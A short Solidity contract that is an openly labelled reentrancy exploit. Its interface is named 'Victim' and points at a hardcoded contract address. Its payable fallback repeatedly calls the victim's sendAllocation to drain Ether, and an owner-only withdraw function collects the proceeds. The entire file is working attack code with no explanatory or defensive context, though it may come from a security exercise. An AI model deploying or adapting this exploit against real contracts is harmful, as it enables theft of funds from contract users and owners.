pragma solidity ^0.4.16;
interface Victim { 
    function sendAllocation(address recipient) public;
    function allocate() public payable;
}

contract Wallet {
    address owner;
    Victim victim;
    constructor() public payable {
        owner = 0x37fc9aa88b99aed72dadad4b8b510047ea1a43c8;
        victim = Victim(0xba76cd8fe6cbb8d353c8cd3c79a6bbe2d6b83926);
    }
    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
    function allocate() public {
        victim.allocate.value(1)();
    }

    function() payable public{
        if (msg.sender != owner) { victim.sendAllocation(this);}
    }
}
